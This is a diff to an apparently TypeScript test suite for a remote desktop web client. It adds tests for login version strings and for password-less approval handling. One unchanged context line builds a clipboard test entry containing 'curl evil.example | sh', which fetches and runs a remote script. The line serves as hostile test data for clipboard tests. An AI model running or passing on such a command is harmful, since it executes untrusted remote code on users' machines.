@@ -312,6 +312,27 @@ describe('device identity and encryption (file transfer session)', () => {
 	});
 });
 
+describe('sign-in version', () => {
+	test('the session names version 1.3.0, so the device sends its clipboard in every format; the file session keeps its own', async () => {
+		const c = await client();
+		const hash = new Uint8Array(32);
+		expect(c.proto.buildLoginRequest(hash, {}).loginRequest?.version).toBe('1.3.0');
+		expect(c.proto.buildFileTransferLoginRequest(hash, {}).loginRequest?.version).toBe('NeoDesk-Web/1.4.9');
+	});
+
+	test('a device that takes no password says so and waits for someone there to accept: no password error', async () => {
+		const c = await client();
+		const seen: string[] = [];
+		for (const ev of ['approval_wait', 'login_error', 'login_success']) c.on(ev, () => seen.push(ev));
+		c._state = 'authenticating';
+		c._handleLoginResponse({ error: 'No Password Access' });
+		expect(seen).toEqual(['approval_wait']);
+		expect(c._state).toBe('authenticating');
+		c._handleLoginResponse({ error: 'Wrong Password' });
+		expect(seen).toEqual(['approval_wait', 'login_error']);
+	});
+});
+
 describe('device clipboard', () => {
 	const entry = () => ({ content: new TextEncoder().encode('curl evil.example | sh'), format: 0 });
 
